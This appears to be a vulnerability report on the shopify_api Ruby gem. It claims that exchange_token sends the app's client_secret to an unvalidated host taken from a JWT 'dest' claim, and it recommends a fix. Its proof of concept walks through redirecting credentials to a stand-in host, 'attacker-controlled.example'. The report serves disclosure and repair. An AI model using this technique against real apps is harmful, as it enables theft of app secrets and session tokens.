### Title
`TokenExchange.exchange_token` sends the app's `client_secret` to an unvalidated host derived from the JWT `dest` claim - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` builds the OAuth token-exchange request host directly from the session token's `dest` claim without running it through `Utils::ShopValidator`, unlike every sibling credential-granting method in the library. This breaks the identity binding: *host validated as a trusted Shopify domain* vs. *host that actually receives the app's `client_secret`*.

### Finding Description
`exchange_token` decodes the caller-supplied session token, extracts the shop via `JwtPayload#shop` (`@dest.gsub("https://", "")`), and uses that raw string as the request host that receives the app's `client_secret`: [1](#0-0) 

`JwtPayload#shop` performs no validation that the `dest` claim is a trusted Shopify domain — it only strips the `https://` prefix: [2](#0-1) 

That value is passed straight into `Session.new(shop: dest_shop)`, and `Clients::HttpClient#initialize` uses `session.shop` verbatim to compose `@base_uri`, which is where the POST body containing `client_secret` is delivered: [3](#0-2) 

Every other credential-granting method in the same module intentionally binds the "authenticated shop" to a Shopify-trusted domain before using it to build this exact request host:
- `TokenExchange.migrate_to_expiring_token` (same file): [4](#0-3) 
- `ClientCredentials.client_credentials`: [5](#0-4) 
- `RefreshToken.refresh_access_token`: [6](#0-5) 

All three call `Utils::ShopValidator.sanitize!`, which enforces that the domain resolves to one of `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) before it is trusted to receive the client secret: [7](#0-6) 

`exchange_token` is the sole outlier: it treats the JWT `dest` claim itself as sufficient proof of a trustworthy host. While the JWT signature (verified against `Context.api_secret_key`) proves the token was issued by an entity holding the shared secret, it does not by itself guarantee `dest` is a `*.myshopify.com`/trusted-domain host — session tokens issued for non-admin surfaces (e.g. checkout/POS/UI-extension contexts) can legitimately carry a merchant's own storefront/custom domain in `dest`, a domain the merchant tenant — not Shopify — fully controls via DNS. This is exactly the class of binding the library's own `ShopValidator` module exists to enforce, and which it enforces everywhere else. The equality that should hold is:
`host that receives client_secret == host validated by ShopValidator.sanitize!(shop)`,
but in `exchange_token` the right side is skipped entirely.

### Impact Explanation
An unprivileged holder of a shop-scoped, but non-`myshopify.com`-bound session token (or any shop able to point its custom/storefront domain at infrastructure it controls) can cause the gem to POST the app's `client_id`/`client_secret` and the raw `subject_token` to a host that the tenant — not Shopify — controls. This is credential exfiltration of the app's `client_secret` (and leakage of a live session token) to an attacker/tenant-controlled endpoint, matching the "Critical: theft or exfiltration of the app's `client_secret`" / "High: SSRF with the app's credentials" impact classes.

### Likelihood Explanation
Requires only calling `exchange_token` with a session token whose `dest` claim is not a `myshopify.com`/trusted-domain value — no leaked secrets, TLS interception, or privileged account needed, since `dest` is not restricted to `*.myshopify.com` at the protocol level. Every analogous method in this same file/module treats this as worth guarding against by calling `ShopValidator.sanitize!`, underscoring that this omission is the anomaly, not the expected behavior.

### Recommendation
In `exchange_token`, validate `dest_shop` through `Utils::ShopValidator.sanitize!` (as `migrate_to_expiring_token` does two methods below it) before constructing `shop_session`/`HttpClient`, and raise `Errors::InvalidShopError` if the `dest` claim does not resolve to a trusted Shopify domain.

### Proof of Concept
1. Attacker controls or is issued a valid, Shopify-signed session token (e.g., via a checkout UI extension or embedded surface context) whose `dest` claim is set to a merchant-controlled custom/storefront domain, `attacker-controlled.example`, rather than `*.myshopify.com`.
2. App calls:
```ruby
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: token_with_dest_attacker_controlled_example,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
```
3. `JwtPayload.new(token).shop` returns `"attacker-controlled.example"` unchecked (`lib/shopify_api/auth/jwt_payload.rb:47-51`).
4. `Clients::HttpClient.new(session: Session.new(shop: "attacker-controlled.example"), base_path: "/admin/oauth")` builds `@base_uri_and_path = "https://attacker-controlled.example/admin/oauth"` (`lib/shopify_api/clients/http_client.rb:18-19`).
5. `client.request(...)` POSTs `{client_id, client_secret, grant_type, subject_token, subject_token_type, requested_token_type}` to `https://attacker-controlled.example/admin/oauth/access_token` (`lib/shopify_api/auth/token_exchange.rb:52-74`), leaking the app's `client_secret` and the session token to that host.
